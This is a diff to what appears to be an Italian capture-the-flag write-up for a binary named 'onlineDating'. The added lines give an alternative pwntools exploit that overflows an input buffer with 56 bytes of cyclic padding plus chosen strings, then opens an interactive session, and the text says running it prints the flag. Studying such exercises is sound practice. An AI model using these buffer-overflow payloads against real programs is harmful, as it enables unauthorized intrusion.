@@ -73,5 +73,16 @@ with process('./onlineDating') as p:
     print(p.recv())
 
 
+UN ALTRA SOLUZIONE:
+from pwn import *
+
+payload = cyclic(56) + b'Gerard_Pique' + b'Clara_C.' + b'TwingoOo' + b'CasioOo!'
+
+# r = gdb.debug('./onlineDating')
+r = process('./onlineDating')
+r.sendlineafter(b'Please tell us how to update it (max 50 char):', payload)
+r.interactive()
+
+
 
 Nel terminale scrivo python3 <nomefilepython> e ho la flag in stampa
